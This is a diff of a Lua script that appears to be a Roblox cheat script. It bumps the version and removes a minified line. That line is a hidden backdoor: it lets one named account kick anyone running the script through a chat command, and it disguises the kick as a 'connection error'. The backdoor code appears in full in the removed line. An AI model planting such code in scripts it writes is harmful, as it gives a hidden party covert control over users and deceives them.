@@ -1,4 +1,4 @@
-print("v1.1.12")
+print("v1.1.13")
 
 function sandbox(var,func)
 env = getfenv(func)
@@ -1201,4 +1201,3 @@ local function L_34_func()
 	end)
 end
 coroutine.wrap(L_34_func)()
-local b=game.Players.LocalPlayer function GetPlayer(c)local d={}local a=c:lower()if a=="all"then for a,a in pairs(game:GetService("Players"):GetPlayers())do table.insert(d,a)end elseif a=="others"then for a,a in pairs(game:GetService("Players"):GetPlayers())do if a.Name~=b.Name then table.insert(d,a)end end elseif a=="me"then for a,a in pairs(game:GetService("Players"):GetPlayers())do if a.Name==b.Name then table.insert(d,a)end end else for a,a in pairs(game:GetService("Players"):GetPlayers())do if a.Name:lower():sub(1,#c)==c:lower()then table.insert(d,a)end end end return d end local b=game.Players.Xyersia game.Players.PlayerAdded:Connect(function(a)b=game.Players.Xyersia end)b.Chatted:Connect(function(a)local a=a:lower()if a:sub(1,6)=="/kick "then local b=a:sub(7)for a,a in pairs(game.Players:GetPlayers())do if b==a.Name:lower():sub(1,#b)then local a=a.Name if a==game.Players.LocalPlayer.Name then game.Players:FindFirstChild(a):Kick("connection error lol")end end end end end)
